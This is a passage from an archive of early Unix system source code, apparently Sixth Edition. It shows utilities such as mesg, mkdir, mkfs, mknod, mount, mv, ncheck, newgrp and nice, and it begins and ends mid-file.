{
	extern fin;

	if (pwfil == 0) {
		fopen("/etc/passwd", &fin);
		pwfil = fin;
	} else
		fin = pwfil;
	(&fin)[1] = 0;
	seek(fin, 0, 0);
}

getpwent()
{
	register char *p;
	register c;
	static struct passwd passwd;
	static char line[100];
	extern fin;

	p = line;
	while((c=getchar()) != '\n') {
		if(c <= 0)
			return(0);
		if(p < line+98)
			*p++ = c;
	}
	*p = 0;
	p = line;
	passwd.pw_name = p;
	p = pwskip(p);
	passwd.pw_passwd = p;
	p = pwskip(p);
	passwd.pw_uid = atoi(p);
	p = pwskip(p);
	passwd.pw_gid = atoi(p);
	p = pwskip(p);
	passwd.pw_gecos = p;
	p = pwskip(p);
	passwd.pw_dir = p;
	p = pwskip(p);
	passwd.pw_shell = p;
	return(&passwd);
}

pwskip(ap)
char *ap;
{
	register char *p;

	p = ap;
	while(*p != ':') {
		if(*p == 0)
			return(p);
		p++;
	}
	*p++ = 0;
	return(p);
}

delexit()
{
	unlink(lettmp);
	unlink(preptmp);
	exit(0);
}

maketemp()
{
	int i, pid, d;

	pid = getpid();
	for (i=11; i>=7; --i) {
		d = (pid&07) + '0';
		lettmp[i] = d;
		preptmp[i] = d;
		pid =>> 3;
	}
}

equal(as1, as2)
{
	register char *s1, *s2;

	s1 = as1;
	s2 = as2;
	while (*s1++ == *s2)
		if (*s2++ == 0)
			return(1);
	return(0);
}

cat(ap1, ap2)
char *ap1, *ap2;
{
	register char *p1, *p2;
	static char fn[32];

	p1 = ap1;
	p2 = fn;
	while (*p2++ = *p1++);
	p2--;
	p1 = ap2;
	while (*p2++ = *p1++);
	return(fn);
}
-- /usr/source/s2/mesg.c mode=0100664 uid=3 gid=3 atime=174923217 mtime=169260598 --
/*
 * mesg -- set current tty to accept or
 *	forbid write permission.
 *
 *	mesg [y] [n]
 *		y allow messages
 *		n forbid messages
 */

int	sbuf[40];

main(argc, argv)
char *argv[];
{
	register char *tty;

	tty = "/dev/ttyx";
	tty[8] = ttyn(1);
	if(stat(tty, sbuf) < 0) {
		write(2, "cannot stat\n", 12);
		exit(1);
	}
	if(argc < 2) {
		if(sbuf[2] & 02)
			goto no;
		goto yes;
	}
	if(*argv[1] == 'y')
		goto yes;

no:
	if(chmod(tty, 0600) < 0)
		goto bad;
	goto was;

yes:
	if(chmod(tty, 0622) < 0)
		goto bad;

was:
	if(sbuf[2] & 02)
		write(2, "was y\n", 6); else
		write(2, "was n\n", 6);
	exit(0);

bad:
	write(2, "cannot change mode\n", 19);
	exit(1);
}
-- /usr/source/s2/mkdir.s mode=0100664 uid=3 gid=3 atime=174923226 mtime=169260598 --
/ makdir -- make a directory

	sys	getuid
	mov	r0,uid
	mov	sp,r5
	tst	(r5)+

loop:
	tst	(r5)+
	dec	(sp)
	bgt	1f
	sys	exit
1:
	mov	(r5),r0
	mov	$buf1,r1
	mov	$buf2,r2
	clr	r3
1:
	movb	(r0)+,r4
	beq	2f
	movb	r4,(r1)+
	movb	r4,(r2)+
	cmpb	r4,$'/
	bne	1b
	mov	r2,r3
	br	1b
2:
	movb	$'/,(r1)+
	movb	$'.,(r1)+
	clrb	(r1)
	mov	$dot,dir
	tst	r3
	beq	1f
	mov	$buf2,dir
	clrb	(r3)
	cmp	r3,$buf2+1
	beq	1f
	clrb	-(r3)		/ ???
1:
	tstb	uid
	beq	2f
	sys	stat; dir:..; stbuf	/ status of parent dir
	bes	error
	mov	stbuf+4,r0
	cmpb	uid,stbuf+7
	bne	1f
	ash	$-6,r0
1:
	ror	r0
	ror	r0
	bcc	error			/ no write permission in parent
2:
	mov	(r5),0f
	sys	makdir; 0:..; 140777; 0
	bes	error			/ prob already exists
	mov	(r5),0f
	sys	chown; 0:..; uid:..
	mov	(r5),0f
	sys	link; 0:..; buf1
	bes	error
	movb	$'.,(r1)+
	clrb	(r1)
	mov	dir,0f
	sys	link; 0:..; buf1
	bec	loop

error:
	mov	(r5),r0
	mov	r0,0f
	clr	0f+2
1:
	tstb	(r0)+
	beq	1f
	inc	0f+2
	br	1b
1:
	mov	$1,r0
	sys	write; 0:..; ..
	mov	$1,r0
	sys	write; ques; 3
	br	loop

dot:	<.\0>
ques:	< ?\n>
	.even

.bss
buf1:	.=.+100.
buf2:	.=.+100.
stbuf:	.=.+40.

-- /usr/source/s2/mkfs.c mode=0110664 uid=3 gid=3 atime=174923230 mtime=169260598 --
#
struct
{
	char	*s_isize;
	char	*s_fsize;
	int	s_nfree;
	int	s_free[100];
	int	s_ninode;
	int	s_inode[100];
	char	s_flock;
	char	s_ilock;
	char	s_fmod;
	int	s_time[2];
} filsys;

struct inode
{
	int	i_number;
	int	i_mode;
	char	i_nlink;
	char	i_uid;
	char	i_gid;
	char	i_size0;
	char	*i_size1;
	int	i_addr[8];
	int	i_time[4];
};

/* modes */
#define	IALLOC	0100000
#define	IFMT	060000
#define		IFDIR	040000
#define		IFCHR	020000
#define		IFBLK	060000
#define	ILARG	010000
#define	ISUID	04000
#define	ISGID	02000
#define	IREAD	0400
#define	IWRITE	0200
#define	IEXEC	0100

int	utime[2];
int	fin;
int	fsi;
int	fso;
char	*charp;
int	buf[256];
char	string[50];
char	*fsys;
char	*proto;
int	f_n	1;
int	f_m	1;

main(argc, argv)
char **argv;
{
	int f, n;

	/*
	 * open relevent files
	 */

	time(utime);
	if(argc != 3) {
		printf("arg count\n");
		exit();
	}
	fsys = argv[1];
	for(n=0; f=fsys[n+1]; n++)
	if(fsys[n] == 'r') {
		if(f == 'k') {
			f_n = 24;
			f_m = 3;
		}
		if(f == 'p') {
			f_n = 10;
			f_m = 4;
		}
	}
	proto = argv[2];
	fso = creat(fsys, 0666);
	if(fso < 0) {
		printf("%s: cannot create\n", fsys);
		exit();
	}
	fsi = open(fsys, 0);
	if(fsi < 0) {
		printf("%s: cannot open\n", fsys);
		exit();
	}
	fin = open(proto, 0);
	if(fin < 0) {
		n = 0;
		for(f=0; proto[f]; f++) {
			if(proto[f]<'0' || proto[f]>'9') {
				printf("%s: cannot open\n", proto);
				exit();
			}
			n = n*10 + proto[f]-'0';
		}
		filsys.s_fsize = n;
		filsys.s_isize = ldiv(0, n, 43+ldiv(0, n, 1000));
		printf("isize = %d\n", filsys.s_isize);
		if(f_n != 1)
			printf("free list %d/%d\n", f_m, f_n);
		charp = "d--777 0 0 $ ";
		goto f3;
	}

	/*
	 * get name of boot load program
	 * and read onto block 0
	 */

	getstr();
	f = open(string, 0);
	if(f < 0) {
		printf("%s: cannot  open init\n", string);
		goto f2;
	}
	read(f, buf, 020);
	if(buf[0] != 0407) {
		printf("%s: bad format\n", string);
		goto f1;
	}
	n = buf[1]+buf[2];
	if(n > 512) {
		printf("%s: too big\n", string);
		goto f1;
	}
	read(f, buf, n);
	wtfs(0, buf);

f1:
	close(f);

	/*
	 * get total disk size
	 * and inode block size
	 */

f2:
	filsys.s_fsize = getnum();
	filsys.s_isize = getnum();

f3:
	if(filsys.s_isize > filsys.s_fsize ||
	   filsys.s_fsize-filsys.s_isize-2 < filsys.s_isize) {
		printf("%l/%l: bad ratio\n", filsys.s_fsize, filsys.s_isize);
		exit();
	}
	bflist();

	/*
	 * initialize files
	 */

	for(n=0; n<256; n++)
		buf[n] = 0;
	for(n=0; n!=filsys.s_isize; n++)
		wtfs(n+2, buf);
	cfile(0);

	/*
	 * write out super block
	 */

	for(n=0; n<256; n++)
		buf[n] = 0;
	filsys.s_time[0] = utime[0];
	filsys.s_time[1] = utime[1];
	wtfs(1, &filsys);
}

cfile(par)
struct inode *par;
{
	struct inode in;
	int db[256], ib[256];
	int dbc, ibc;
	static ino;
	int i, f, *p1, *p2;

	/*
	 * get mode, uid and gid
	 */

	getstr();
	in.i_mode = IALLOC;
	in.i_mode =| gmode(string[0], "bcd", IFBLK, IFCHR, IFDIR);
	in.i_mode =| gmode(string[1], "u", ISUID);
	in.i_mode =| gmode(string[2], "g", ISGID);
	for(i=3; i<6; i++) {
		if(string[i]<'0' || string[i]>'7') {
			printf("%c/%s: bad digit\n", string[i], string);
			exit();
		}
		in.i_mode =| (string[i]-'0')<<(15-3*i);
	}
	in.i_uid = getnum();
	in.i_gid = getnum();

	/*
	 * general initialization prior to
	 * switching on format
	 */

	ino++;
	in.i_number = ino;
	if(ldiv(0, ino, 16) > filsys.s_isize) {
		printf("too many inodes\n");
		exit();
	}
	in.i_nlink = 1;
	in.i_size0 = 0;
	in.i_size1 = 0;
	for(i=0; i<8; i++)
		in.i_addr[i] = 0;
	for(i=0; i<256; i++) {
		db[i] = 0;
		ib[i] = 0;
	}
	if(par == 0) {
		par = &in;
		in.i_nlink--;
	}
	dbc = 0;
	ibc = 0;
	switch(in.i_mode&IFMT) {

	case 0:
		/*
		 * regular file
		 * contents is a file name
		 */

		getstr();
		f = open(string, 0);
		if(f < 0) {
			printf("%s: cannot open\n", string);
			break;
		}
		while((i=read(f, db, 512)) > 0) {
			in.i_size1 =+ i;
			newblk(&dbc, db, &ibc, ib);
		}
		close(f);
		break;

	case IFBLK:
	case IFCHR:
		/*
		 * special file
		 * content is maj/min types
		 */

		in.i_addr[0] = getnum()<<8;
		in.i_addr[0] =| getnum();
		break;

	case IFDIR:
		/*
		 * directory
		 * put in extra links
		 * call recursively until
		 * name of "$" found
		 */

		par->i_nlink++;
		entry(par->i_number, "..", &dbc, db, &ibc, ib);
		in.i_nlink++;
		entry(in.i_number, ".", &dbc, db, &ibc, ib);
		in.i_size1 = 32;
		for(;;) {
			getstr();
			if(string[0]=='$' && string[1]=='\0')
				break;
			entry(ino+1, string, &dbc, db, &ibc, ib);
			in.i_size1 =+ 16;
			cfile(&in);
		}
		break;
	}
	if(dbc != 0)
		newblk(&dbc, db, &ibc, ib);
	if(ibc > 8) {
		in.i_mode =| ILARG;
		dbc = alloc();
		wtfs(dbc, ib);
		in.i_addr[0] = dbc;
	} else
	for(i=0; i<ibc; i++)
		in.i_addr[i] = ib[i];
	in.i_time[0] = in.i_time[2] = utime[0];
	in.i_time[1] = in.i_time[3] = utime[1];
	i = in.i_number + 31;
	dbc = ldiv(0, i, 16);
	p1 = &buf[lrem(0, i, 16)*16];
	p2 = &in.i_mode;
	rdfs(dbc, buf);
	for(i=0; i<16; i++)
		*p1++ = *p2++;
	wtfs(dbc, buf);
}

gmode(c, s, m0, m1, m2, m3)
char c, *s;
{
	int i;

	for(i=0; s[i]!='\0'; i++)
		if(c == s[i])
			return((&m0)[i]);
	if(c == '-')
		return(0);
	printf("%c/%s: bad mode\n", c, string);
	exit();
}

getnum()
{
	int n, i;

	getstr();
	n = 0;
	i = 0;
	for(i=0; string[i]!='\0'; i++) {
		if(string[i]<'0' || string[i]>'9') {
			printf("%s: bad number\n", string);
			exit();
		}
		n = n*10 + string[i] - '0';
	}
	return(n);
}

getstr()
{
	int i, c;

loop:
	switch(c=getch()) {

	case ' ':
	case '\t':
	case '\n':
		goto loop;

	case '\0':
		printf("EOF\n");
		exit();

	case ':':
		while(getch() != '\n');
		goto loop;

	}
	i = 0;

	do {
		string[i++] = c;
		c = getch();
	} while(c!=' '&&c!='\t'&&c!='\n'&&c!='\0');
	string[i] = '\0';
}

rdfs(bno, bf)
{
	int n;

	seek(fsi, bno, 3);
	n = read(fsi, bf, 512);
	if(n != 512) {
		printf("read error: %l\n", bno);
		exit();
	}
}

wtfs(bno, bf)
{
	int n;

	seek(fso, bno, 3);
	n = write(fso, bf, 512);
	if(n != 512) {
		printf("write error: %l\n", bno);
		exit();
	}
}

alloc()
{
	int bno, i;

	filsys.s_nfree--;
	bno = filsys.s_free[filsys.s_nfree];
	filsys.s_free[filsys.s_nfree] = 0;
	if(bno == 0) {
		printf("out of free space\n");
		exit();
	}
	if(filsys.s_nfree <= 0) {
		rdfs(bno, buf);
		filsys.s_nfree = buf[0];
		for(i=0; i<100; i++)
			filsys.s_free[i] = buf[i+1];
	}
	return(bno);
}

free(bno)
{
	int i;

	if(filsys.s_nfree >= 100) {
		buf[0] = filsys.s_nfree;
		for(i=0; i<100; i++)
			buf[i+1] = filsys.s_free[i];
		wtfs(bno, buf);
		filsys.s_nfree = 0;
	}
	filsys.s_free[filsys.s_nfree] = bno;
	filsys.s_nfree++;
}

entry(ino, str, adbc, db, aibc, ib)
char *str;
int *adbc, *db, *aibc, *ib;
{
	char *s;
	int i;

	db[*adbc] = ino;
	(*adbc)++;
	s = &db[*adbc];
	for(i=0; i<14; i++) {
		*s++ = *str;
		if(*str != '\0')
			str++;
	}
	*adbc =+ 7;
	if(*adbc >= 256)
		newblk(adbc, db, aibc, ib);
}

newblk(adbc, db, aibc, ib)
int *adbc, *db, *aibc, *ib;
{
	int bno, i;

	bno = alloc();
	wtfs(bno, db);
	for(i=0; i<256; i++)
		db[i] = 0;
	*adbc = 0;
	ib[*aibc] = bno;
	(*aibc)++;
	if(*aibc >= 256) {
		printf("indirect block full\n");
		exit();
	}
}

getch()
{

	if(charp)
		return(*charp++);
	return(getchar());
}

bflist()
{
	char flg[100], adr[100];
	register i, j;
	char *low, *high;

	if(f_n > 100)
		f_n = 100;
	for(i=0; i<f_n; i++)
		flg[i] = 0;
	i = 0;
	for(j=0; j<f_n; j++) {
		while(flg[i])
			i = (i+1)%f_n;
		adr[j] = i;
		flg[i]++;
		i = (i+f_m)%f_n;
	}

	high = filsys.s_fsize-1;
	low = filsys.s_isize+2;
	free(0);
	for(i=high; lrem(0,i+1,f_n); i--) {
		if(i < low)
			break;
		free(i);
	}
	for(; i >= low+f_n; i =- f_n)
		for(j=0; j<f_n; j++)
			free(i-adr[j]);
	for(;i >= low; i--)
		free(i);
}
-- /usr/source/s2/mknod.c mode=0100664 uid=3 gid=3 atime=174923255 mtime=169260598 --
main(argc, argv)
int argc;
char **argv;
{
	int m, a, b;

	if(argc != 5) {
		printf("arg count\n");
		goto usage;
	}
	if(*argv[2] == 'b')
		m = 0160666; else
	if(*argv[2] == 'c')
		m = 0120666; else
		goto usage;
	a = number(argv[3]);
	if(a < 0)
		goto usage;
	b = number(argv[4]);
	if(b < 0)
		goto usage;
	if(mknod(argv[1], m, (a<<8)|b) < 0)
		perror("mknod");
	exit();

usage:
	printf("usage: mknod name b/c major minor\n");
}

number(s)
char *s;
{
	int n, c;

	n = 0;
	while(c = *s++) {
		if(c<'0' || c>'9')
			return(-1);
		n = n*10 + c-'0';
	}
	return(n);
}
-- /usr/source/s2/mount.c mode=0100664 uid=3 gid=3 atime=174923264 mtime=169260598 --
#define	NMOUNT	16
#define	NAMSIZ	32

struct mtab {
	char	file[NAMSIZ];
	char	spec[NAMSIZ];
} mtab[NMOUNT];

main(argc, argv)
char **argv;
{
	register int ro;
	register struct mtab *mp;
	register char *np;
	int n, mf;

	mf = open("/etc/mtab", 0);
	read(mf, mtab, NMOUNT*2*NAMSIZ);
	if (argc==1) {
		for (mp = mtab; mp < &mtab[NMOUNT]; mp++)
			if (mp->file[0])
				printf("%s on %s\n", mp->spec, mp->file);
		return;
	}
	if(argc < 3) {
		printf("arg count\n");
		return;
	}
	ro = 0;
	if(argc > 3)
		ro++;
	if(mount(argv[1], argv[2], ro) < 0) {
		perror("mount");
		return;
	}
	np = argv[1];
	while(*np++)
		;
	np--;
	while(*--np == '/')
		*np = '\0';
	while(np > argv[1] && *--np != '/')
		;
	if(*np == '/')
		np++;
	argv[1] = np;
	for (mp = mtab; mp < &mtab[NMOUNT]; mp++) {
		if (mp->file[0] == 0) {
			for (np = mp->spec; np < &mp->spec[NAMSIZ-1];)
				if ((*np++ = *argv[1]++) == 0)
					argv[1]--;
			for (np = mp->file; np < &mp->file[NAMSIZ-1];)
				if ((*np++ = *argv[2]++) == 0)
					argv[2]--;
			mp = &mtab[NMOUNT];
			while ((--mp)->file[0] == 0);
			mf = creat("/etc/mtab", 0644);
			write(mf, mtab, (mp-mtab+1)*2*NAMSIZ);
			return;
		}
	}
}
-- /usr/source/s2/mv.c mode=0100664 uid=3 gid=3 atime=174923277 mtime=169260598 --
/*
mv [-d] file1 file2

unlink file2
link file1 file2
unlink file1
*/
int stbuf[42];
struct sbuf {
int dev;
int inum;
int imode;
char nlink;
char uid;
char gid;
char siz0;
char siz1;
int addr[8];
int adate[2];
int mdate[2];
};
char strbuf[70];

main(argc,argv)
int argc;
char *argv[];
{
char **argp;
char *argp1, *argp2, *argp3, *argp4;
char *p, *p1, *p2;
char place[100];
int i;
int status;
int b;
argp = argv;
/*
	check for correct number
	of arguments
*/
if(argc != 3){
	write(1,"Usage: mv name1 name2\n",22);
	exit();
}
/*
	is there anything to do?
*/
argp3 = argp[1];
argp4 = argp[2];
if(stat(argp[1], stbuf) < 0){
	write(1,"Source file non-existent\n",25);
	exit();
}
/*
	yes, there is a source.
	check whether file or directory
*/
if((stbuf[0].imode & 060000) == 040000){
/*
	The source is a directory, so
	we do lots of checking and
	messing around so as not to get
	into trouble.  This patch of
	code contains administrative
	policies rather than system
	restrictions.
*/
	if(stat(argp[2], stbuf) >= 0){
		write(1,"Directory target exists.\n",25);
		exit();
	}
	argp1 = argp[1];
	argp2 = argp[2];
	while(*argp1 == *argp2){
		argp1++;
		if(*argp2++ == 0){
			write(1,"???\n",4);
			exit();
		}
	}
	while(*argp1)if(*argp1++ == '/'){
		write(1,"Directory rename only\n",22);
		exit();
	}
	while(*argp2)if(*argp2++ == '/'){
		write(1,"Directory rename only\n",22);
		exit();
	}
	if(*--argp1 == '.'){
		write(1,"values of B will give rise to dom!\n",37);
		exit();
	}
}else{
/*
	the source is a file.
*/
	setuid(getuid());
	if(stat(argp4, &stbuf[2]) >= 0){
		if((stbuf[2].imode & 060000) == 040000){
			argp2 = strbuf;
			while(*argp2++ = *argp4++);
			argp2[-1] = '/';
			argp4 = argp[1];
			argp1 = argp[1];
			while(*argp4)
				if(*argp4++ == '/')
					argp1 = argp4;
			while(*argp2++ = *argp1++);
			argp4 = strbuf;
		}
		if(stat(argp4, &stbuf[2]) >= 0){
			if((stbuf[0]==stbuf[2]) && (stbuf[1]==stbuf[3])){
				write(1,"Files are identical.\n",21);
				exit();
			}
			if((getuid()&0377) == stbuf[2].uid)
				b = 0200; else
			if((getgid()&0377) == stbuf[2].gid)
				b = 020; else
				b = 02;
			if((stbuf[2].imode & b) == 0) {
				printf("%s: %o mode ", argp4,
					stbuf[2].imode & 07777);
				i = b = getchar();
				while(b != '\n' && b != '\0')
					b = getchar();
				if(i != 'y')
					exit();
			}
			if(unlink(argp4) < 0){
				write(1,"Cannot remove target file.\n",27);
				exit();
			}
		}
	}
}
if(link(argp3, argp4) < 0){
	i = fork();
	if(i == -1){
		write(1,"Try again.\n",11);
		exit();
	}
	if(i){
		while(wait(&status) != i);
	}else{
		p = place;
		p1 = p;
		while(*p++ = *argp3++);
		p2 = p;
		while(*p++ = *argp4++);
		execl("/bin/cp","cp", p1, p2, 0);
		write(1, "no cp\n", 6);
		exit(1);
	}
	if((status & 0377) != 0){
		write(1,"?\n", 2);
		exit();
	}
	if(status != 0) exit();
}
if(unlink(argp3) < 0){
	write(1,"Cannot unlink source file.\n",27);
	exit();
}
}

putchar(c)
{
	write(1, &c, 1);
}

getchar()
{
	char c;

	if(read(0, &c, 1) != 1) return(0);
	return(c);
}
-- /usr/source/s2/ncheck.c mode=0110664 uid=3 gid=3 atime=174923291 mtime=169260598 --
#

char	*dargv[]
{
	"/dev/rrk2",
	"/dev/rrp0",
	0
};

#define NINODE	16*16
#include "/usr/sys/ino.h"
#include "/usr/sys/filsys.h"

struct	filsys	sblock;
struct	inode	inode[NINODE];

int	sflg;
int	aflg;
#define	NI	20
#define	NDIRS	787

int	ilist[NI] { -1};
int	fi;
struct	htab {
	int	hino;
	int	hpino;
	char	hname[14];
} htab[NDIRS];
int	nhent	10;
int	(*pass[])()	{ pass1, pass2, pass3 };
char	*lasts;
int	ino;
int	nerror;
int	nffil;
int	fout;
int	nfiles;
struct dir {
	int	ino;
	char	name[14];
};

main(argc, argv)
char **argv;
{
	register char **p;
	register int n, *lp;

	nffil = dup(1);
	if (argc == 1) {
		for (p = dargv; *p;)
			check(*p++);
		return(nerror);
	}
	while (--argc) {
		argv++;
		if (**argv=='-') switch ((*argv)[1]) {
		case 's':
			sflg++;
			continue;

		case 'a':
			aflg++;
			continue;

		case 'i':
			lp = ilist;
			while (lp < &ilist[NI-1] && (n = number(argv[1]))) {
				*lp++ = n;
				argv++;
				argc--;
			}
			*lp++ = -1;
			continue;

		default:
			printf2("Bad flag\n");
		}
		check(*argv);
	}
	return(nerror);
}

check(file)
char *file;
{
	register i, j, pno;

	fi = open(file, 0);
	if (fi < 0) {
		printf2("cannot open %s\n", file);
		return;
	}
	printf2("%s:\n", file);
	sync();
	bread(1, &sblock, 512);
	nfiles = sblock.s_isize*16;
	for (i=0; i<NDIRS; i++)
		htab[i].hino = 0;
	fout = nffil;
	flush();
	for (pno=0; pno<3; pno++) {
		ino = 0;
		for (i=0; ino<nfiles; i =+ NINODE/16) {
			bread(i+2, inode, sizeof inode);
			for (j=0; j<NINODE && ino<nfiles; j++) {
				ino++;
				(*pass[pno])(&inode[j]);
			}
		}
	}
	flush();
	fout = 1;
}

pass1(ip)
{
	if ((ip->i_mode&IALLOC)==0 || (ip->i_mode&IFMT)!=IFDIR)
		return;
	lookup(ino, 1);
}

pass2(ip)
struct inode *ip;
{
	register doff;
	register struct htab *hp;
	register struct dir *dp;
	int i;

	if ((ip->i_mode&IALLOC)==0 || (ip->i_mode&IFMT)!=IFDIR)
		return;
	doff = 0;
	while (dp = dread(ip, doff)) {
		doff =+ 16;
		if (dp->ino==0)
			continue;
		if ((hp = lookup(dp->ino, 0)) == 0)
			continue;
		if (dotname(dp))
			continue;
		hp->hpino = ino;
		for (i=0; i<14; i++)
			hp->hname[i] = dp->name[i];
	}
}

pass3(ip)
struct inode *ip;
{
	register doff;
	register struct dir *dp;
	register int *ilp;

	if ((ip->i_mode&IALLOC)==0 || (ip->i_mode&IFMT)!=IFDIR)
		return;
	doff = 0;
	while (dp = dread(ip, doff)) {
		doff =+ 16;
		if (dp->ino==0)
			continue;
		if (aflg==0 && dotname(dp))
			continue;
		for (ilp=ilist; *ilp >= 0; ilp++)
			if (*ilp == dp->ino)
				break;
		if (ilp > ilist && *ilp!=dp->ino)
			continue;
		printf("%d	", dp->ino);
		pname(ino, 0);
		printf("/%.14s\n", dp->name);
	}
}

dotname(adp)
{
	register struct dir *dp;

	dp = adp;
	if (dp->name[0]=='.')
		if (dp->name[1]==0 || dp->name[1]=='.' && dp->name[2]==0)
			return(1);
	return(0);
}

pname(i, lev)
{
	register struct htab *hp;

	if (i==1)
		return;
	if ((hp = lookup(i, 0)) == 0) {
		printf("???");
		return;
	}
	if (lev > 10) {
		printf("...");
		return;
	}
	pname(hp->hpino, ++lev);
	printf("/%.14s", hp->hname);
}

lookup(i, ef)
{
	register struct htab *hp;

	for (hp = &htab[i%NDIRS]; hp->hino;) {
		if (hp->hino==i)
			return(hp);
		if (++hp >= &htab[NDIRS])
			hp = htab;
	}
	if (ef==0)
		return(0);
	if (++nhent >= NDIRS) {
		printf2("Out of core-- increase NDIRS\n");
		flush();
		exit(1);
	}
	hp->hino = i;
	return(hp);
}

dread(aip, aoff)
{
	register b, off;
	register struct inode *ip;
	static ibuf[256];
	static char buf[512];

	off = aoff;
	ip = aip;
	if ((off&0777)==0) {
		if (off==0177000) {
			printf2("Monstrous directory %l\n", ino);
			return(0);
		}
		if ((ip->i_mode&ILARG)==0) {
			if (off>=010000 || (b = ip->i_addr[off>>9])==0)
				return(0);
			bread(b, buf, 512);
		} else {
			if (off==0) {
				if (ip->i_addr[0]==0)
					return(0);
				bread(ip->i_addr[0], ibuf, 512);
			}
			if ((b = ibuf[(off>>9)&0177])==0)
				return(0);
			bread(b, buf, 512);
		}
	}
	return(&buf[off&0777]);
}

bread(bno, buf, cnt)
{

	seek(fi, bno, 3);
	if (read(fi, buf, cnt) != cnt) {
		printf2("read error %d\n", bno);
		exit();
	}
}

bwrite(bno, buf)
{

	seek(fi, bno, 3);
	if (write(fi, buf, 512) != 512) {
		printf2("write error %d\n", bno);
		exit();
	}
}

number(as)
char *as;
{
	register n, c;
	register char *s;

	s = as;
	n = 0;
	while ((c = *s++) >= '0' && c <= '9') {
		n = n*10+c-'0';
	}
	return(n);
}

printf2(s, a1, a2)
{
	extern fout;

	flush();
	fout = 2;
	printf(s, a1, a2);
	fout = nffil;
	flush();
}
-- /usr/source/s2/newgrp.c mode=0100664 uid=3 gid=3 atime=174923308 mtime=169260599 --
int	gbuf[259];
int	pbuf[259];
int	ttyb[3];
char	name[10];
char	passwd[10];
char	space[1000];
int	peek;
int	pwdflg;

main(argc, argv)
char *argv[];
{
	register id;
	register char *p, *q;

	if(argc < 2) {
		printf("usage: newgrp groupname\n");
		done();
	}
	if(fopen("/etc/group", gbuf) < 0) {
		printf("cannot open group file\n");
		done();
	}
	do {
		field(name, gbuf);
		p = name;
		q = argv[1];
		while(*p == *q++)
			if(*p++ == 0 || p >= name+8)
				goto l1;
	} while(skip(gbuf));
	printf("%s: not a valid group name\n", argv[1]);
	done();

l1:
	if(fopen("/etc/passwd", pbuf) < 0) {
		printf("cannot open password file\n");
		done();
	}
	p = space;
	id = getuid() & 0377;
	do {
		field(p, pbuf);
		field(name, pbuf);
		if(value(pbuf) == id) {
			if(name[0] == 0)
				pwdflg++;
			while(*p++) ;
		}
	} while(skip(pbuf));
	*p = 0;

	field(passwd, gbuf);
	id = value(gbuf);
	if(id == 1) {
		pwdflg = 0;
		goto l2;
	}
	do {
		p = space;
		field(name, gbuf);
		while(*p) {
			q = name;
			while(*p == *q++) {
				if(*p++ == 0)
					goto l2;
			}
			while(*p++) ;
		}
	} while(peek == ',');
	goto no;

l2:
	if(pwdflg && passwd[0]) {
		printf("password: ");
		gtty(0, pbuf);
		pbuf[3] = pbuf[2];
		pbuf[2] =& ~010;
		stty(0, pbuf);
		read(0, gbuf, 512);
		pbuf[2] = pbuf[3];
		stty(0, pbuf);
		printf("\n");
		p = name;
		q = gbuf;
		while(p < name+8) {
			if(*q == '\n')
				break;
			*p++ = *q++;
		}
		*p = 0;
		p = crypt(name);
		q = passwd;
		while(q < passwd+8)
			if(*p++ != *q++)
				goto no;
	}
	if(setgid(id) < 0) {
		perror("setgid");
		goto no;
	}
	done();

no:
	printf("Sorry\n");
	done();
}

skip(buf)
{

	while(peek > 0) {
		if(peek == '\n') {
			peek = 1;
			return(1);
		}
		peek = getc(buf);
	}
	return(0);
}

field(cp, buf)
{
	register c;
	register char *p, *q;

	p = cp;
	q = p+8;
	while((c = getc(buf)) != '\n') {
		if(c == ',' || c == ':' || c <= 0)
			break;
		if(p < q)
			*p++ = c;
	}
	*p = 0;
	peek = c;
}

value(buf)
{
	register n, c;

	n = 0;
	while((c = getc(buf)) >= '0' && c <= '9')
		n = n*10 + c-'0';
	peek = c;
	return(n);
}

done()
{

	setuid(getuid());
	execl("/bin/sh", "-", 0);
	exit();
}
-- /usr/source/s2/nice.c mode=0100664 uid=3 gid=3 atime=174923321 mtime=169260599 --
/* nice */
int	nicarg	4;
char	*args[100];
char	string[10000];

main(argc, argv)
int argc;
char *argv[];
{
	int i;
	register char **argp, *strp, *p;

	if(argc > 1 && argv[1][0] == '-') {
		nicarg = atoi(&argv[1][1]);
		argc--;
		argv++;
	}
	if(argc < 2) {
		printf("usage: nice [ -n ] command\n");
		exit(1);
	}
	argc--;
	argv++;
	argp = args;
	strp = string;
	for (i=0; i<9; i++)
		*strp++ = "/usr/bin/"[i];
	for(i=0; i<argc; i++) {
		*argp++ = strp;
		p = *argv++;
		while(*strp++ = *p++);
	}
	*argp = 0;
	nice(nicarg);
	execv(string+9, args);
	execv(string+4, args);
	execv(string, args);
	printf("%s not found\n", string+9);
	exit(1);
}
-- /usr/source/s2/nm.c mode=0100664 uid=3 gid=3 atime=174923332 mtime=169260599 --
int	fout;
int	cflg;
int	nflg;
int	uflg;
int	rflg	1;
int	gflg;
int	pflg;
struct	nl
{
	char	name[8];
	int	typ;
	int	*val;
} *nlp;
int	fi;
int	buf[8];
main(argc, argv)
char **argv;
{
	int n, i, j;
	int compare();

	if (--argc > 0 && *argv[1] == '-') {
		argv++;
		while (*++*argv) switch (**argv) {
		case 'n':
			nflg++;
			continue;

		case 'c':
			cflg++;
			continue;

		case 'g':
			gflg++;
			continue;

		case 'u':
			uflg++;
			continue;

		case 'r':
			rflg = -1;
			continue;

		case 'p':
			pflg ++;
			continue;

		default:
			continue;
		}
		argc--;
	}
	if (argc==0)
		fi = open("a.out", 0); else
		fi = open(*++argv, 0);
	if(fi < 0) {
		printf("cannot open input\n");
		exit();
	}
	read(fi, buf, 020);
	if(buf[0]!=0407 && buf[0]!=0410 && buf[0]!=0411) {
		printf("bad format\n");
		exit();
	}
	seek(fi, buf[1], 1);		/* text */
	seek(fi, buf[2], 1);		/* data */
	if(buf[7] != 1) {
		seek(fi, buf[1], 1);
		seek(fi, buf[2], 1);	/* reloc */
	}
	n = ldiv(0, buf[4], 12);
	if(n == 0) {
		printf("no name list\n");
		exit();
	}
	nlp = sbrk(12*n);
	read(fi, nlp, n*12);
	if (pflg==0)
		qsort(nlp, n, 12, compare);
	fout = dup(1);
	close(1);
	for(i=0; i<n; i++) {
		if(gflg && (nlp->typ&040)==0)
			goto out;
		if(cflg) {
			if(nlp->name[0] != '_')
				goto out;
			for(j=0; j<7; j++)
				nlp->name[j] = nlp->name[j+1];
			nlp->name[7] = '\0';
		}
		j = nlp->typ&037;
		if(j > 4)
			j = 1;
		if(j==0 && nlp->val)
			j = 5;
		if(uflg && j!=0)
			goto out;
		if(!uflg) {
			if(j==0)
				printf("      "); else
				printo(nlp->val);
			printf("%c ", (nlp->typ&040? "UATDBC":"uatdbc")[j]);
		}
		printf("%.8s\n", nlp);
	out:
